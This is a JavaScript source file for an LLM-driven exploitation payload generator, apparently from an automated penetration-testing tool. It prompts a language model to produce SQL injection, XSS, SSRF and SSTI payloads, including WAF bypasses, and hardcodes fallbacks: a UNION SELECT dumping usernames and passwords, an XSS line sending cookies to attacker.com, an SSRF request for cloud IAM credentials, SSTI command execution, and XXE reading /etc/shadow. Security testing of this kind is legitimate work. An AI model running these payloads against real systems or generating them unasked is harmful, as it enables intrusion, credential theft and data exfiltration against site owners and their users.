import OpenAI from 'openai';
import { fs } from 'zx';
import { RateLimiter, isRateLimitError, formatDelay } from '../utils/rate-limiter.js';

/**
 * LLM-powered intelligent payload generator
 * Generates context-aware payloads based on vulnerability intelligence
 * Implements Shannon's dynamic payload generation approach
 */
export class PayloadGenerator {
  constructor(openaiApiKey, model = 'gpt-4') {
    const apiKey = openaiApiKey || process.env.OPENAI_API_KEY;
    if (!apiKey) {
      throw new Error('OpenAI API key is required. Provide it via constructor or OPENAI_API_KEY environment variable.');
    }
    this.client = new OpenAI({ apiKey });
    this.model = model;
    this.conversationHistory = [];
    
    // Rate limiter with Shannon-style configuration
    this.rateLimiter = new RateLimiter({
      maxRetries: 3,
      enableLogging: true
    });
  }

  /**
   * Generate payloads for a specific vulnerability
   * @param {object} vulnerability - Vulnerability from queue
   * @param {object} context - Intelligence context
   * @param {string} stage - Testing stage (confirmation, fingerprint, exploit)
   * @param {object} previousResults - Results from previous attempts
   * @returns {Promise<Array>} Generated payloads
   */
  async generatePayloads(vulnerability, context, stage = 'confirmation', previousResults = null) {
    const prompt = this.buildPrompt(vulnerability, context, stage, previousResults);
    
    // Use rate limiter with fallback to predefined payloads
    const { result, usedFallback } = await this.rateLimiter.executeWithFallback(
      async () => {
        const response = await this.client.chat.completions.create({
          model: this.model,
          messages: [
            {
              role: 'system',
              content: this.getSystemPrompt(vulnerability.type)
            },
            {
              role: 'user',
              content: prompt
            }
          ],
          temperature: 0.7,
          max_tokens: 2000
        });

        const payloads = this.parsePayloadsFromResponse(response.choices[0].message.content);
        this.conversationHistory.push({
          stage,
          prompt,
          response: response.choices[0].message.content,
          payloads
        });

        return payloads;
      },
      () => this.getFallbackPayloads(vulnerability.type, stage),
      `LLM payload generation (${stage})`
    );

    if (usedFallback) {
      console.warn(`Using fallback payloads for ${vulnerability.type} (${stage})`);
    }

    return result;
  }

  /**
   * Build context-aware prompt for payload generation
   * @private
   */
  buildPrompt(vulnerability, context, stage, previousResults) {
    let prompt = `Generate ${stage} payloads for the following vulnerability:\n\n`;

    // Vulnerability details
    prompt += `**Vulnerability Details:**\n`;
    prompt += `- Type: ${vulnerability.vulnerabilityType || vulnerability.type}\n`;
    prompt += `- Location: ${vulnerability.source || vulnerability.location}\n`;
    prompt += `- Sink: ${vulnerability.sink_call || 'unknown'}\n`;
    if (vulnerability.witnessPayload) {
      prompt += `- Witness Payload (from static analysis): ${vulnerability.witnessPayload}\n`;
    }
    prompt += `\n`;

    // Technology context
    if (context.database) {
      prompt += `**Database:** ${context.database}\n`;
    }
    if (context.os) {
      prompt += `**Operating System:** ${context.os}\n`;
    }
    if (context.framework) {
      prompt += `**Framework:** ${context.framework}\n`;
    }
    if (context.language) {
      prompt += `**Language:** ${context.language}\n`;
    }
    prompt += `\n`;

    // Code context
    if (context.codeSnippet) {
      prompt += `**Vulnerable Code:**\n\`\`\`\n${context.codeSnippet}\n\`\`\`\n\n`;
    }

    // Query structure
    if (context.queryStructure) {
      prompt += `**Query Structure:** ${context.queryStructure}\n\n`;
    }

    // WAF information
    if (context.waf) {
      prompt += `**WAF Detected:** ${context.waf}\n`;
      prompt += `**WAF Bypass Needed:** Yes\n\n`;
    }

    // Previous results for refinement
    if (previousResults) {
      prompt += `**Previous Attempts:**\n`;
      for (const result of previousResults.slice(-3)) { // Last 3 attempts
        prompt += `- Payload: ${result.payload}\n`;
        prompt += `  Result: ${result.success ? '✓ Success' : '✗ Failed'}\n`;
        if (result.error) {
          prompt += `  Error: ${result.error}\n`;
        }
        if (result.response) {
          prompt += `  Response: ${result.response.substring(0, 100)}...\n`;
        }
      }
      prompt += `\n`;
    }

    // Stage-specific instructions
    prompt += this.getStageInstructions(stage, vulnerability.type);

    return prompt;
  }

  /**
   * Get system prompt for vulnerability type
   * @private
   */
  getSystemPrompt(vulnType) {
    const basePrompt = `You are an expert security researcher specializing in ${vulnType} vulnerabilities. Generate effective, context-aware exploitation payloads based on the provided intelligence.

Your responses should:
1. Consider the specific technology stack (database, OS, framework)
2. Use appropriate syntax for the environment
3. Start simple and escalate in complexity
4. Include encoding/bypass techniques if WAF is present
5. Return ONLY the payloads, one per line, without explanations

Format your response as a numbered list of payloads, like:
1. payload_here
2. another_payload
3. third_payload`;

    const typeSpecificAdditions = {
      injection: `\n\nFor SQL injection:
- Use database-specific syntax (MySQL vs PostgreSQL vs MSSQL)
- Start with error-based, then boolean-blind, then time-based
- Include UNION SELECT for data extraction
- Consider comment terminators (-- vs # vs /*)`,

      xss: `\n\nFor XSS:
- Start with basic tags, then event handlers
- Consider context (HTML, JavaScript, attribute)
- Include encoding variations (HTML entities, URL encoding)
- Test both reflected and stored scenarios`,

      ssrf: `\n\nFor SSRF:
- Target metadata endpoints (169.254.169.254)
- Try protocol variations (http, file, gopher)
- Include localhost variations (127.0.0.1, [::1], localhost)
- Consider DNS rebinding if needed`,

      ssti: `\n\nFor SSTI:
- Use template engine-specific syntax (Jinja2, Twig, etc.)
- Start with basic expressions ({{7*7}})
- Escalate to RCE if possible
- Include sandbox escape techniques`
    };

    return basePrompt + (typeSpecificAdditions[vulnType] || '');
  }

  /**
   * Get stage-specific instructions
   * @private
   */
  getStageInstructions(stage, vulnType) {
    const instructions = {
      confirmation: {
        injection: `Generate 3-5 payloads to CONFIRM SQL injection exists:
- Error-inducing characters
- Simple boolean conditions
- Time delay (if needed)

Goal: Detect if vulnerability exists (not exploit yet)`,

        xss: `Generate 3-5 payloads to CONFIRM XSS exists:
- Basic script tags
- Event handlers
- Simple alert/prompt

Goal: Detect if XSS is possible`,

        ssrf: `Generate 3-5 payloads to CONFIRM SSRF exists:
- Metadata endpoint requests
- Internal IP probing
- DNS lookups

Goal: Detect if SSRF is possible`
      },

      fingerprint: {
        injection: `Generate payloads to FINGERPRINT the database:
- Extract database version
- Identify current user
- List database names
- Determine table count

Use UNION SELECT or information_schema queries`,

        xss: `Generate payloads to FINGERPRINT the XSS context:
- Determine execution context (HTML/JS/attribute)
- Test available functions (alert, console.log, etc.)
- Check for CSP presence`,

        ssrf: `Generate payloads to FINGERPRINT internal network:
- Scan common internal IPs
- Check for cloud metadata
- Identify internal services`
      },

      exploit: {
        injection: `Generate payloads to EXTRACT DATA:
- Retrieve user table data
- Extract sensitive information
- Dump first 5 rows from target tables

Use UNION SELECT with specific table names`,

        xss: `Generate payloads to DEMONSTRATE IMPACT:
- Cookie theft
- Session hijacking
- Keylogging
- DOM manipulation`,

        ssrf: `Generate payloads to DEMONSTRATE IMPACT:
- Access sensitive internal endpoints
- Read cloud credentials
- Scan internal network infrastructure`
      }
    };

    return instructions[stage]?.[vulnType] || 
           `Generate payloads for ${stage} stage of ${vulnType} testing.`;
  }

  /**
   * Parse payloads from LLM response
   * @private
   */
  parsePayloadsFromResponse(response) {
    const payloads = [];
    
    // Extract numbered list items
    const numberedPattern = /^\d+\.\s*(.+)$/gm;
    let match;
    while ((match = numberedPattern.exec(response)) !== null) {
      const payload = match[1].trim();
      // Remove markdown code block markers if present
      const cleanPayload = payload.replace(/^`+|`+$/g, '').trim();
      if (cleanPayload) {
        payloads.push(cleanPayload);
      }
    }

    // If no numbered list found, try to extract from code blocks
    if (payloads.length === 0) {
      const codeBlockPattern = /```[\w]*\n([\s\S]+?)\n```/g;
      while ((match = codeBlockPattern.exec(response)) !== null) {
        const lines = match[1].split('\n').filter(line => 
          line.trim() && !line.trim().startsWith('#') && !line.trim().startsWith('//')
        );
        payloads.push(...lines.map(l => l.trim()));
      }
    }

    // If still nothing, extract lines that look like payloads
    if (payloads.length === 0) {
      const lines = response.split('\n');
      for (const line of lines) {
        const trimmed = line.trim();
        if (trimmed && 
            !trimmed.startsWith('#') && 
            !trimmed.startsWith('//') &&
            !trimmed.toLowerCase().includes('payload') &&
            trimmed.length > 2) {
          payloads.push(trimmed);
        }
      }
    }

    return payloads.slice(0, 10); // Limit to 10 payloads
  }

  /**
   * Get fallback payloads if LLM fails
   * @private
   */
  getFallbackPayloads(vulnType, stage) {
    const fallbacks = {
      injection: {
        confirmation: [`'`, `"`, `'; SELECT SLEEP(5)--`, `' AND 1=1--`, `' AND 1=2--`],
        fingerprint: [`' UNION SELECT @@version--`, `' UNION SELECT user()--`],
        exploit: [`' UNION SELECT username, password FROM users--`]
      },
      xss: {
        confirmation: [`<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`],
        fingerprint: [`<script>console.log(document.domain)</script>`],
        exploit: [`<script>document.location='http://attacker.com/'+document.cookie</script>`]
      },
      ssrf: {
        confirmation: [`http://169.254.169.254/`, `http://localhost/`, `http://127.0.0.1/`],
        fingerprint: [`http://169.254.169.254/latest/meta-data/`],
        exploit: [`http://169.254.169.254/latest/meta-data/iam/security-credentials/`]
      },
      ssti: {
        confirmation: [`{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `*{7*7}`],
        fingerprint: [`{{config}}`, `{{self.__class__.__mro__}}`, `{{request.application.__globals__}}`],
        exploit: [`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`, `{{''.__class__.__mro__[2].__subclasses__()}}`]
      },
      xxe: {
        confirmation: [`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`],
        fingerprint: [`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>`],
        exploit: [`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>`]
      },
      deserialization: {
        confirmation: [`O:8:"stdClass":0:{}`, `rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==`],
        fingerprint: [`ysoserial payloads`],
        exploit: [`O:7:"Example":1:{s:4:"data";s:10:"phpinfo()";}`]
      }
    };

    return fallbacks[vulnType]?.[stage] || [`test_payload`];
  }

  /**
   * Refine payloads based on response
   * Generates new payloads based on what worked/didn't work
   */
  async refinePayloads(vulnerability, context, previousAttempts) {
    const refinementPrompt = `Based on the following test results, generate improved payloads:

**What Worked:**
${previousAttempts.filter(a => a.success).map(a => `- ${a.payload} → Success`).join('\n') || '- Nothing worked yet'}

**What Failed:**
${previousAttempts.filter(a => !a.success).slice(-3).map(a => 
  `- ${a.payload} → Failed (${a.error || 'Unknown error'})`
).join('\n')}

Generate 3-5 new payloads that:
1. Build on successful attempts
2. Avoid patterns that failed
3. Try bypass techniques if WAF is blocking
4. Use different encoding if validation is blocking`;

    return this.generatePayloads(
      vulnerability,
      context,
      'refinement',
      previousAttempts
    );
  }

  /**
   * Get conversation history for debugging
   */
  getHistory() {
    return this.conversationHistory;
  }

  /**
   * Clear conversation history
   */
  clearHistory() {
    this.conversationHistory = [];
  }
}

/**
 * Create payload generator instance
 */
export function createPayloadGenerator(apiKey = null, model = 'gpt-4') {
  return new PayloadGenerator(apiKey, model);
}
